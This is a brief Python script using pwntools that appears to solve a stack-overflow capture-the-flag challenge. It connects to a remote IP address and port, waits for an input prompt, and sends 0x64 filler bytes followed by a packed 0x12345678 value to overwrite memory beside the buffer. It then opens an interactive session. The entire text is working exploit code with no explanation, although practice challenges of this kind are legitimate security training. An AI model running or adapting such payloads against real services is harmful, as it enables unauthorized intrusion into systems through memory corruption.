from pwn import *

sh = remote("139.199.10.70",10012)
#sh = process("./stackoverflow2")
sh.recvuntil("input:")
payload = 'a'*0x64+p32(0x12345678)
sh.sendline(payload)


sh.interactive()
